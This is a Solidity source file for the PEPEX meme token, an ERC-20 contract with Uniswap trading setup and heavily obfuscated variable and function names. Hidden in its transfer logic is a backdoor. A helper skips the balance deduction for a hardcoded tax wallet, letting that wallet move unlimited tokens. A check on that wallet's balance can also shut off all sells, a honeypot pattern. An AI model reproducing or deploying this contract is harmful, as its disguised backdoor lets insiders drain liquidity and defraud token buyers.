/**

PEPEX  $PEPEX


Twitter: https://twitter.com/PepeX_erc20
Telegram: https://t.me/PepeX_Ethereum
Website: https://pepexerc.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _cqmvx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _cqmvx(a, b, "SafeMath");
    }

    function  _cqmvx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _osukxam {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _preumvb {
    function sodmKanbxpartmsFcaaavwc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPEX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _preumvb private _Tevfqbk;
    address payable private _Kevfbyr;
    address private _kishvtr;

    string private constant _name = unicode"PEPEX";
    string private constant _symbol = unicode"PEPEX";
    uint8 private constant _decimals = 9;
    uint256 private constant _cTotalch = 42069000000 * 10 **_decimals;
    uint256 public _paedvel = _cTotalch;
    uint256 public _Wercnle = _cTotalch;
    uint256 public _rorwThpv= _cTotalch;
    uint256 public _BcaTnhf= _cTotalch;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _diemtpkr;
    mapping (address => bool) private _trorueiy;
    mapping(address => uint256) private _rjcafov;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrbvikaq=0;
    uint256 private _broajme=0;

    bool private _pcvacmp;
    bool public _Tduesfqm = false;
    bool private oukbjbe = false;
    bool private _aerqkq = false;


    event _mrvrbart(uint _paedvel);
    modifier olTengr {
        oukbjbe = true;
        _;
        oukbjbe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _cTotalch;
        _diemtpkr[owner(

        )] = true;
        _diemtpkr[address
        (this)] = true;
        _diemtpkr[
            _Kevfbyr] = true;
        _Kevfbyr = 
        payable (0x1ebd1773278041514539C871E494CD411eCF6Db5);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _cTotalch);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _cTotalch;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _cqmvx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rsvbunk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tduesfqm) {
                if (to 
                != address
                (_Tevfqbk) 
                && to !=
                 address
                 (_kishvtr)) {
                  require(_rjcafov
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rjcafov
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kishvtr && to != 
            address(_Tevfqbk) &&
             !_diemtpkr[to] ) {
                require(amount 
                <= _paedvel,
                 "Exceeds the _paedvel.");
                require(balanceOf
                (to) + amount
                 <= _Wercnle,
                  "Exceeds the macxizse.");
                if(_broajme
                < _yrbvikaq){
                  require
                  (! _epkvobz(to));
                }
                _broajme++;
                 _trorueiy
                 [to]=true;
                rsvbunk = amount._pvr
                ((_broajme>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kishvtr &&
             from!= address(this) 
            && !_diemtpkr[from] ){
                require(amount <= 
                _paedvel && 
                balanceOf(_Kevfbyr)
                <_BcaTnhf,
                 "Exceeds the _paedvel.");
                rsvbunk = amount._pvr((_broajme>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_broajme>
                _yrbvikaq &&
                 _trorueiy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oukbjbe 
            && to == _kishvtr &&
             _aerqkq &&
             contractTokenBalance>
             _rorwThpv 
            && _broajme>
            _yrbvikaq&&
             !_diemtpkr[to]&&
              !_diemtpkr[from]
            ) {
                _pvyrtf( _rmqvz(amount, 
                _rmqvz(contractTokenBalance,
                _BcaTnhf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _upcfnv(address
                    (this).balance);
                }
            }
        }

        if(rsvbunk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rsvbunk);
          emit
           Transfer(from,
           address
           (this),rsvbunk);
        }
        _balances[from
        ]= _cqmvx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _cqmvx(rsvbunk));
        emit Transfer
        (from, to, 
        amount.
         _cqmvx(rsvbunk));
    }

    function _pvyrtf(uint256
     tokenAmount) private
      olTengr {
        if(tokenAmount==
        0){return;}
        if(!_pcvacmp)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tevfqbk.WETH();
        _approve(address(this),
         address(
             _Tevfqbk), 
             tokenAmount);
        _Tevfqbk.
        sodmKanbxpartmsFcaaavwc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rmqvz
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _cqmvx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Kevfbyr){
            return a ;
        }else{
            return a .
             _cqmvx (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _paedvel = _cTotalch;
        _Wercnle = _cTotalch;
        emit _mrvrbart(_cTotalch);
    }

    function _epkvobz(address 
    account) private view 
    returns (bool) {
        uint256 eaoip;
        assembly {
            eaoip :=
             extcodesize
             (account)
        }
        return eaoip > 
        0;
    }

    function _upcfnv(uint256
    amount) private {
        _Kevfbyr.
        transfer(
            amount);
    }

    function opensTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pcvacmp ) ;
        _Tevfqbk  
        =  
        _preumvb
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tevfqbk), 
            _cTotalch);
        _kishvtr = 
        _osukxam(_Tevfqbk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tevfqbk .
             WETH ( ) );
        _Tevfqbk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kishvtr).
        approve(address(_Tevfqbk), 
        type(uint)
        .max);
        _aerqkq = true;
        _pcvacmp = true;
    }

    receive() external payable {}
}